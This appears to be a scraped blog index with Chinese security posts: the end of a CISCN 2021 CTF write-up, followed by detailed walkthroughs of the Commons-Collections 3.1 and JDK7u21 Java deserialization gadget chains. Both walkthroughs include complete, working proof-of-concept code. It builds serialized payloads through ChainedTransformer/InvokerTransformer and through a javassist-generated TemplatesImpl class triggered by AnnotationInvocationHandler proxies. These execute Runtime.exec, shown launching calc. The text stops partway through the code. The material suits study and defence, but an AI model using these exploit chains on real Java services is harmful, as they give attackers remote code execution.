open(&quot;1.zip&quot;, 'rb')}response = requests.post(url, files=files,proxies=proxies)print(response.text) 修改文件名中的i为unicode字符，同时添加绕过长宽限制的字符串 上传成功 在example.php解压文件 题目提示flag保存在/etc/中的多级目录下，递归访问一下即可 拿到flag","link":"/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"java反序列化学习-CommonsCollections3.1","text":"commons-collections-3.1Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。 漏洞存在版本为3.1 123456789&lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; poc执行过程12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import org.apache.commons.collections.*;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class Commons_collections_Test { public static void main(String[] args) throws Exception { //1.客户端构建攻击代码 //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }), new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(&quot;value&quot;, &quot;value&quot;); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //反射机制调用AnnotationInvocationHandler类的构造函数 Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class); //取消构造函数修饰符限制 ctor.setAccessible(true); //获取AnnotationInvocationHandler类实例 Object instance = ctor.newInstance(Target.class, outerMap); //payload序列化写入文件，模拟网络传输 FileOutputStream f = new FileOutputStream(&quot;payload.bin&quot;); ObjectOutputStream fout = new ObjectOutputStream(f); fout.writeObject(instance); //2.服务端读取文件，反序列化，模拟网络传输 FileInputStream fi = new FileInputStream(&quot;payload.bin&quot;); ObjectInputStream fin = new ObjectInputStream(fi); //服务端反序列化 fin.readObject(); }} 调用栈 org.apache.commons.collections.map.AbstractInputCheckedMapDecorator#setValue 首先进入setValue，调用了checkSetValue org.apache.commons.collections.map.TransformedMap#checkSetValue this.valueTransformer等于ChainedTransformer类，调用了ChainedTransformer类中的transform方法 org.apache.commons.collections.functors.ChainedTransformer#transform 根据this.iTransformers数组的值可以知道，第一次进入的是ConstantTransformer类的transform方法，后三次进入的是InvokerTransformer类的transform。transform的返回值会作为下个transform函数的参数， 看一下ChainedTransformer的构造函数，可以发现this.iTransformers可控 org.apache.commons.collections.functors.ChainedTransformer#ConstantTransformer 第一次进入的transform org.apache.commons.collections.functors.InvokerTransformer#transform 后三次进入InvokerTransformer的Transformer方法，这里存在反射调用，参数可控。 12345setValue()-&gt;checkSetvalue()-&gt;`ChainedTransformer`类中的`transform`方法-&gt;四次循环，第一次进入ConstantTransformer的transform，后三次进入InvokerTransformer的transform-&gt;触发反射 反射链org.apache.commons.collections.functors.InvokerTransformer#transform 这里实现了反射调用，如果input等于Runtime类，那么input.getClass获取到的是java.lang.class，无法获取到方法，必须让input等于Runtime实例 1234567891011121314151617public Object transform(Object input) { if (input == null) { return null; } else { try { //input必须为Runtime的实例，cls才会等于Runtime类， Class cls = input.getClass(); //this.iMethodName等于exec，this.iParamTypes等于String.class Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //this.Args为要执行的命令 return method.invoke(input, this.iArgs); } ......... }} 看一下构造函数，三个属性都是传入参数 参考反射命令执行代码 123456Class.forName(&quot;java.lang.Runtime&quot;) .getMethod(&quot;exec&quot;, String.class) .invoke( Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)) , &quot;calc.exe&quot; ); 需要满足以下条件 1234this.iMethodName=“exec”this.iParamTypes=String.classinput=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))this.iArgs=&quot;calc.exe&quot; 尝试尝试构造执行命令 12345678910import org.apache.commons.collections.functors.InvokerTransformer;public class Commons_collections_Test { public static void main(String[] args) throws Exception { InvokerTransformer invokerTransformer=new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new String[]{&quot;calc.exe&quot;}); invokerTransformer.transform(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))); }} 可以成功执行，但是还存在一个问题就是无法传入Runtime的实例对象。 两种获取Runtime实例的错误思路用readObject模拟反序列化 序列化 123456789101112131415161718192021222324252627282930313233import org.apache.commons.collections.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;public class Commons_collections_Test { public static void main(String[] args) throws Exception { //构造InvokerTransformer InvokerTransformer a=new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new String[]{&quot;calc.exe&quot;}); //序列化 FileOutputStream f=new FileOutputStream(&quot;payload.bin&quot;); ObjectOutputStream fout=new ObjectOutputStream(f); fout.writeObject(a); //构造传入transform的参数，Runtime实例 Object input=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)); //反序列化 FileInputStream fi=new FileInputStream(&quot;payload.bin&quot;); ObjectInputStream fin=new ObjectInputStream(fi); InvokerTransformer b=(InvokerTransformer) fin.readObject(); //触发漏洞，调用transform，input为传入参数 b.transform(input); }} 反序列化 可以看到存在一个问题，必须给transform传入一个构造好的Runtime实例也就是input才可以触发漏洞，实际环境里不可能有这样一个构造好的实例，那么能否利用反序列化给transform传入Runtime实例呢？ 123456789101112131415161718192021import org.apache.commons.collections.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.ObjectInputStream;import java.io.Serializable;public class Serial implements Serializable { public static void main(String[] args) throws Exception{ //构造传入transform的参数，为Runtime实例， Object input=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)); //反序列化 FileInputStream fi=new FileInputStream(&quot;payload.bin&quot;); ObjectInputStream fin=new ObjectInputStream(fi); InvokerTransformer b=(InvokerTransformer) fin.readObject(); //触发漏洞，调用transform，input为传入参数 b.transform(input); }} org.apache.commons.collections.functors.ChainedTransformer#transform 这里可以控制传入transform的参数，因为object的来源是上一次this.ITransformers[i].transform的返回值，而且因为iTransformers可控，我们可以调用任意一个类的transform方法 org.apache.commons.collections.functors.ChainedTransformer#ConstantTransformer 这里我们可以控制this.iContant，它会等于下一次执行的传入参数object。表面上看让它等于Runtime实例就解决了之前无法传入Runtime实例的问题，但是实际上并不可行，因为Runtime类不能被反序列化 123456789101112131415161718192021222324252627282930313233import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;public class Commons_collections_Test { public static void main(String[] args) throws Exception { //构造Transformers数组 Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new String[]{&quot;calc.exe&quot;}) }; //用ChainedTransformer封装构造好的Transformers数组，也就是让构造好的数组等于this.iTransformers Transformer transformerChain=new ChainedTransformer(transformers); //序列化 FileOutputStream f=new FileOutputStream(&quot;payload.bin&quot;); ObjectOutputStream fout=new ObjectOutputStream(f); fout.writeObject(transformerChain); }} 执行失败 换一种思路，有没有可能利用反射直接在服务器生成一个Runtime实例？ 123456789101112131415161718192021222324252627import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;public class Commons_collections_Test { public static void main(String[] args) throws Exception { //构造transformers Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getRuntime&quot;,new Class[]{},new Object[]{}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new String[]{&quot;calc.exe&quot;}) }; Transformer transformerChain=new ChainedTransformer(transformers); transformerChain.transform(null); }} 依然报错，原因是前面提到的反射机制，Runtime.class返回java.lang.class，这里我们必须把Runtime.class换成Runtime实例.class才能按预想中的执行，但是我们现在就在想办法得到Runtime实例，这样就变成一个死循环了。这个方法也不行 反射套娃getRuntime方法会返回Runtime实例，只要获取到了getRuntime方法再invoke执行就等于获取到了Runtime实例。既然无法直接获取Runtime实例，那可以去尝试获取getRuntime方法。 注意：开始传入的是java.lang.class类（Runtime.class） 步骤 12345671. 通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制2. 通过getMethod函数获取Runtime类中的getRuntime函数。在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的3. 再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数4. invoke调用getRuntime函数，获取Runtime类的实例。里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类 关于反射 123456类.getMethod(要获取的方法名,要获取方法的参数类型) 获得方法对象方法对象.invoke(相关类实例/相关类,参数) 执行方法invoke的第一个参数是执行method的对象obj： 如果这个方法是一个普通方法，那么第一个参数是类对象 如果这个方法是一个静态方法，那么第一个参数是类 接下来分析一下利用反射机制进行反射调用的过程 第一次循环直接返回了Runtime.class 1input1=Runtime.class 第二次 实际执行的代码 1234//第二次循环 Class cls2=input1.getClass(); //cls2:java.lang.class类 Method method2=cls2.getMethod(&quot;getMethod&quot;, String.class, Class[].class);//method2:通过反射获取到的getMethod对象 Object input2=method2.invoke(input1,new Object[] {&quot;getRuntime&quot;, new Class[]{} });//input2:getRuntime对象 第三次循环，最重要的一步，先用反射获取invoke方法对象，然后利用invoke方法对象.invoke执行传入getRuntime方法对象，得到Runtime实例 123456//第三次循环，input是通过反射获取到的getRuntime对象 Class cls3=input2.getClass();//java.lang.reflec.Method类 Method method3=cls3.getMethod(&quot;invoke&quot;, new Class[] {Object.class, Object[].class });//method3:invoke方法对象.第二个参数为invoke的参数类型 //invoke方法对象.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs) Object input3=method3.invoke(input2,new Object[] {null, new Object[]{} }); //input3:Runtime实例 第四次循环 1234//第四次循环，已经获取到了Runtime实例 Class cls4=input3.getClass(); //cls4:java.lang.Runtime类 Method method4=cls4.getMethod(&quot;exec&quot;,new Class[] {String.class });//method4:exec方法对象 method4.invoke(input3,new Object[] {&quot;calc.exe&quot;});//exec方法对象.invoke(Runtime实例,参数) 简化流程 1234567891011121314151617181920212223242526272829import java.lang.reflect.Method;public class Commons_collections_Test { public static void main(String[] args) throws Exception { //第一次循环,返回了Runtie.class Class input1=Runtime.class; //第二次循环 Class cls2=input1.getClass(); //cls2:java.lang.class类 Method method2=cls2.getMethod(&quot;getMethod&quot;, String.class, Class[].class);//method2:通过反射获取到的getMethod对象 Object input2=method2.invoke(input1,new Object[] {&quot;getRuntime&quot;, new Class[]{} });//input2:getRuntime对象 //第三次循环，input是通过反射获取到的getRuntime对象 Class cls3=input2.getClass();//java.lang.reflec.Method类 Method method3=cls3.getMethod(&quot;invoke&quot;, new Class[] {Object.class, Object[].class });//method3:invoke方法对象.第二个参数为invoke的参数类型 //invoke方法对象.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs) Object input3=method3.invoke(input2,new Object[] {null, new Object[]{} }); //input3:Runtime实例 //第四次循环，已经获取到了Runtime实例 Class cls4=input3.getClass(); //cls4:java.lang.Runtime类 Method method4=cls4.getMethod(&quot;exec&quot;,new Class[] {String.class });//method4:exec方法对象 method4.invoke(input3,new Object[] {&quot;calc.exe&quot;});//exec方法对象.invoke(Runtime实例,参数) }} 反序列化触发点到目前为止我们已经构造好了反射利用链，现在来看一下如何触发，触发需要两个条件 121.服务器调用readObject反序列化构造好的ChainedChainedTransformer2.调用反序列化后的ChainedTransformer类中的transform方法执行命令 代码如下，实际环境中基本不可能满足这两个条件，因此我们需要寻找其他触发方式 123456789101112131415161718192021222324252627282930313233343536373839import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;public class Commons_collections_Test { public static void main(String[] args) throws Exception { Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), //根据transform的执行规则，InvokeTransformer类构造函数的第一个参数为要执行的，第二个参数为一个Class[]，包含了要获取方法的参数类型。第三个参数为invoke的第二个参数 new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[]{}}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}) }; //把构造好的数组封装成ChainedTransformer ChainedChainedTransformer chainedTransformer=new ChainedTransformer(transformers); //序列化数据 FileOutputStream fileOutputStream=new FileOutputStream(&quot;payload.bin&quot;); ObjectOutputStream objectOutputStream=new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(chainedTransformer); //反序列化数据 FileInputStream fileInputStream=new FileInputStream(&quot;payload.bin&quot;); ObjectInputStream objectInputStream=new ObjectInputStream(fileInputStream); //调用反序列化后的ChainedTransformer类中的transform方法触发 ChainedTransformer SerialChainTransformer=(ChainedTransformer)objectInputStream.readObject(); SerialChainTransformer.transform(null); }} 绑定Map和转换链之前我们把构造好的Transformer数组封装成了一个ChainedTransformer，它实质上是一个转换链，而TransformerMap类的构造函数可以绑定map和转换链，只要在map中添加数据就会自动调用这个转换链，执行payload，这样降低了触发的难度 org.apache.commons.collections.map.TransformedMap TransformedMap类的功能是存储键值对并将其转换为transform objects，decorate方法可创建键值对组，用于绑定map和转换链 代码实例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.util.HashMap;import java.util.Map;public class Commons_collections_Test { public static void main(String[] args) throws Exception { Transformer[] transformers=new Transformer[]{ new ConstantTransformer(Runtime.class), //根据transform的执行规则，InvokeTransformer类构造函数的第一个参数为要执行的，第二个参数为一个Class[]，包含了要获取方法的参数类型。第三个参数为invoke的第二个参数 new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,new Class[]{}}), new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,new Object[]{}}), new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc&quot;}) }; //把构造好的数组封装成ChainedTransformer ChainedTransformer chainedTransformer=new ChainedTransformer(transformers); Map innerMap=new HashMap(); innerMap.put(&quot;value&quot;,&quot;value&quot;); Map map=TransformedMap.decorate(innerMap,null,chainedTransformer); //序列化map FileOutputStream fileOutputStream=new FileOutputStream(&quot;payload.bin&quot;); ObjectOutputStream objectOutputStream=new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(map); FileInputStream fileInputStream=new FileInputStream(&quot;payload.bin&quot;); ObjectInputStream objectInputStream=new ObjectInputStream(fileInputStream); //反序列化 Map UnserializedMap=(Map)objectInputStream.readObject(); //只要修改Map的值就会触发转换链，执行payload //向Map中添加新值 //UnserializedMap.put(&quot;123&quot;,&quot;123&quot;); //修改键值 Map.Entry entry = (Map.Entry) UnserializedMap.entrySet().iterator().next(); entry.setValue(&quot;foobar&quot;); }} 现在触发条件变成了经过迭代器迭代调用setValue函数修改Map值来触发漏洞，继续寻找调用了setValue的地方 AnnotationInvocationHandler的readObject复写点jdk1.7中有一个存在readobject复写点的类sun.reflect.annotation.AnnotationInvocationHandler。java在反序列化中会优先调用复写的readObject AnnotationInvocationHandler构造函数 存在setValue，触发漏洞 1234567891011121314151617181920212223242526private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { return; } Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) { Entry var5 = (Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6))); //存在setValue } } } }","link":"/2021/04/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CommonsCollections3-1/"},{"title":"jdk7u21反序列化","text":"原理由javassist负责构建一个恶意类并得到字节码，然后向TemplatesImpl的_bytecodes属性赋值恶意类的字节码，字节码数组在被defineTransletClasses()中被实例化成恶意类，调用构造函数中的命令触发RCE，需要调用getOutputProperties()触发 12345恶意类的父类必须为ABSTRACT_TRANSLET TemplatesImpl类的_bytecodes不为null，为恶意类字节码TemplatesImpl类的_name不为nullTemplatesImpl类的_class=null_tfactory需要是一个拥有getExternalExtensionsMap()方法的类，即TransformerFactoryImpl()，以此来兼容不同版本 defindTransletClasses()执行完后，_class[_transletIndex]就已经是恶意类，接下来执行newInstance()实例化恶意类，从而执行构造方法中的payload defineTransletClasses()中恶意类的构造，把恶意类的字节码转换为类的实例类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950private void defineTransletClasses() throws TransformerConfigurationException { //_bytecodes不能为null if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader()); } }); //获取_bytecodes的长度，创建_class数组，这里需要让恶意类的字节码为一个二维字节数组 try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) { _auxClasses = new Hashtable(); } for (int i = 0; i &lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // 恶意类的父类必须是ABSTRACT_TRANSLET if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex &lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } catch (ClassFormatError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (LinkageError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 构造payload1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import java.lang.reflect.Field;public class Myjdk7u21 { //封装setFieldValue()方法，便于给类字段赋值 private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { Field field=obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { //ClassPool对象是一个表示class文件的CtClass对象的容器 ClassPool pool =ClassPool.getDefault(); //创建恶意类Evil CtClass cc=pool.makeClass(&quot;Evil&quot;); //设置恶意类父类为AbstractTranslet cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //创建恶意类的构造函数，写入payload CtConstructor cons=new CtConstructor(new CtClass[]{},cc); cons.setBody(&quot;{ Runtime.getRuntime().exec(\\&quot;calc\\&quot;);}&quot;); cc.addConstructor(cons); //将Evil类转换成byte数组 byte[] TempByteCode=cc.toBytecode(); byte[][] ByteCode=new byte[][]{TempByteCode}; //实例化TemplatesImpl类 TemplatesImpl templates=TemplatesImpl.class.newInstance(); //为TemplatesImpl类的各个字段赋值 setFieldValue(templates,&quot;_bytecodes&quot;,ByteCode); setFieldValue(templates,&quot;_class&quot;,null); setFieldValue(templates,&quot;_name&quot;,&quot;x&quot;); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); templates.getOutputProperties(); }} 动态代理当没有没有触发getOutputProperties()的点，就需要使用动态代理，代理是为了在不改变目标对象方法的情况下对方法进行增强 动态代理是java的特性之一，其实就可以理解为web应用中的拦截器，在执行正式代码之前先过一个拦截器函数（比如spring的AOP）。但是以上类比只是为了便于理解，实际上spring的AOP之类的拦截器反而是基于java的动态代理实现的。 例子 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;// 需要实现的接口（拦截动作是基于接口的，所以需要设定接口）interface ISubject { public void hello(String str);}// 实际的需要被代理的对象class SubjectImpl implements ISubject { public void hello(String str) { System.out.println(&quot;SubjectImpl.hello(): &quot; + str); }}// Handler对象（继承InvocationHandler的拦截器）//InvocationHandler是一个用于跟Proxy类对接的接口class Handler implements InvocationHandler { private Object subject; //构造函数，传入被代理实现类的实例 public Handler(Object subject) { this.subject = subject; }//所有被Proxy拦截的函数都会经过这个接口的invoke函数 public Object invoke(Object object, Method method, Object[] args) throws Throwable { System.out.println(&quot;before!&quot;); //完成拦截操作之后去调用被代理实现类，反射机制，传入实例，参数 method.invoke(this.subject, args); System.out.println(&quot;after!&quot;); return null; }}public class DynamicProxy { public static void main(String[] args) { //被代理类 SubjectImpl subject = new SubjectImpl(); //拦截器实现类，通过构造函数传入被代理类的实例 InvocationHandler tempHandler = new Handler(subject);// 使用Proxy.newProxyInstance创建代理 ISubject iSubject = (ISubject) Proxy.newProxyInstance(DynamicProxy.class.getClassLoader(), new Class&lt;?&gt;[] {ISubject.class}, tempHandler); iSubject.hello(&quot;world!&quot;); }} Proxy.newProxyInstance三个传入参数： 123loader，选用的类加载器。interfaces，被代理类所实现的接口，这个接口可以是多个。即需要拦截的接口handler，一个 实现拦截器的invocation handler。 设置动态代理后，只要调用了返回对象中被安排代理的接口，就会进入invocationHandler的invoke函数。 延长利用链：AnnotationInvocationHandlerAnnotationInvocationHandler是一个InvocationHandler的实现类 sun.reflect.annotation.AnnotationInvocationHandler#AnnotationInvocationHandler 先看一下AnnotationInvocationHandler的构造函数 在payload构造中传入参数 1InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map); 这样 12this.type=Templates.classthis.membervalues=map 这里的AnnotationInvocationHandler构造函数是缺省修饰符，在不同的包中是不能直接调用 反射机制中提到，可以使用setAccessible(true)来开放权限。 exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.*;import javassist.*;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.*;import java.util.*;public class Myjdk7u21 { //序列化 public static byte[] serialize(final Object obj) throws Exception { ByteArrayOutputStream btout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(btout); objOut.writeObject(obj); return btout.toByteArray(); } //反序列化 public static Object unserialize(final byte[] serialized) throws Exception { ByteArrayInputStream btin = new ByteArrayInputStream(serialized); ObjectInputStream objIn = new ObjectInputStream(btin); return objIn.readObject(); } //通过反射为obj的属性赋值 private static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { Field field=obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } //封装了之前对恶意TemplatesImpl类的构造 private static TemplatesImpl getEvilTemplatesImpl() throws Exception{ ClassPool pool = ClassPool.getDefault();//ClassPool对象是一个表示class文件的CtClass对象的容器 CtClass cc = pool.makeClass(&quot;Evil&quot;);//创建Evil类 cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));//设置Evil类的父类为AbstractTranslet CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);//创建无参构造函数 cons.setBody(&quot;{ Runtime.getRuntime().exec(\\&quot;calc\\&quot;); }&quot;);//设置无参构造函数体 cc.addConstructor(cons); byte[] byteCode=cc.toBytecode();//toBytecode得到Evil类的字节码 byte[][] targetByteCode = new byte[][]{byteCode}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates,&quot;_bytecodes&quot;,targetByteCode); setFieldValue(templates,&quot;_class&quot;,null); setFieldValue(templates,&quot;_name&quot;,&quot;xx&quot;); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); return templates; } public static void main(String[] args) throws Exception { TemplatesImpl templates=getEvilTemplatesImpl(); HashMap map = new HashMap(); //通过反射创建代理使用的handler，AnnotationInvocationHandler作为动态代理的handler Constructor ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0]; ctor.setAccessible(true); InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map); Templates proxy = (Templates) Proxy.newProxyInstance(Myjdk7u21.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler); LinkedHashSet set = new LinkedHashSet(); set.add(templates); set.add(proxy); map.put(&quot;f5a5a608&quot;, templates); byte[] obj=serialize(set); unserialize(obj); }} 反序列化LinkedHashSet类就可以执行命令。 Java在反序列化的时候会调用ObjectInputStream类的readObject()方法，如果被反序列化的类重写了readObject()，那么该类在进行反序列化时，Java会优先调用重写的readObject()方法。 LinkedHashSet类没有readObject()，但是它的父类HashSet存在readObject()，两者都继承了Serializable接口 readObject()中把Templates和proxy加入到map 进入put()， 这里会和上一个 Entry 的 Key (templates) 进行比较，判断这两个对象是否相等，如果相等则新的替换老的值，然后返回老的值。 关键点在于key.equals(k)，添加的顺序是，前一个为 templates 后一个为proxy。 要到达key.equals(k)需要先满足条件e.hash == hash，也就是满足hash(templates)== hash(proxy)，这个条件下面再说 根据||的规则，第一个值为false时才能进入第二个。此时，key等于proxy，e.key等于templates类，这样(k = e.key) == key返回false。进入key.equals(k) 由于使用了动态代理，调用Templates.equals()就会进入AnnotaionlnvocationHandler的invoke()，然后因为满足if条件进入equalsImpl。 这里的 123var1为当前proxy代理实例对象，等于之前的keyvar2为当前调用方法，等于equals方法对象var3为当前调用方法的传入参数列表，等于TemplatesImpl类，也就是之前的k和e.key sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl 进入equalsImpl()，前两个条件都不满足，进入getMemberMethods sun.reflect.annotation.AnnotationInvocationHandler#getMemberMethods 满足条件this.memberMethods，this.type等于Templates，这样就会返回Templates中的所有方法，包括getOutputProperties() 回到equalsImpl，这里会获取this.type类中所有的方法，然后遍历并调用每一个方法。这里让this.type等于Templates接口就可以调用Templates中的所有方法，包括getOutputProperties()，触发payload 1234567891011121314151617181920212223242526272829303132333435private Boolean equalsImpl(Object var1) {//var1等于构造好的templates if (var1 == this) { return true; } else if (!this.type.isInstance(var1)) { return false; } else { Method[] var2 = this.getMemberMethods();//var2为Templates的所有方法 int var3 = var2.length;//var3为Templates方法的数量 for(int var4 = 0; var4 &lt; var3; ++var4) {//迭代Templates的所有方法 Method var5 = var2[var4];//var5为Templates的中的某个方法 String var6 = var5.getName();//var6为该方法的名称 Object var7 = this.memberValues.get(var6);//在memberValues中获取key为var6的值，但memberValues只有一个key为f5a5a608的键值对，所以var7为null Object var8 = null; AnnotationInvocationHandler var9 = this.asOneOfUs(var1);//var9也为null if (var9 != null) { var8 = var9.memberValues.get(var6); } else { try { var8 = var5.invoke(var1);//运行会到这里，所以会调用Templates中的所有方法 } catch (InvocationTargetException var11) { return false; } catch 